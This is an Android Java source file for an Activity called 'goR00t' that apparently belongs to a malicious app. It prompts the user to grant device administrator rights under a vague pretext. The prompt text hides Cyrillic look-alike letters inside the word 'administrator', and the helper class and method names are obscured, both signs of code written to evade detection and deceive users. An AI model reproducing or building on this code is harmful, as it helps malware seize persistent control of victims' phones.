package com.example.livemusay.myapplication;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.Intent;
import android.os.Bundle;

public class goR00t extends Activity {
    private PoM_adm PPM;
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_go_adm);

      PPM = new PoM_adm(this);

         if (!PPM.ISS())
        {
            Intent activateDeviceAdmin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, PPM.GAC());
            activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "For correct operation of the program, you must confirm аdministrаtоr rights");
            startActivityForResult(activateDeviceAdmin,  PoM_adm.DMP);
            finish();
        }
        finish();
    }
}
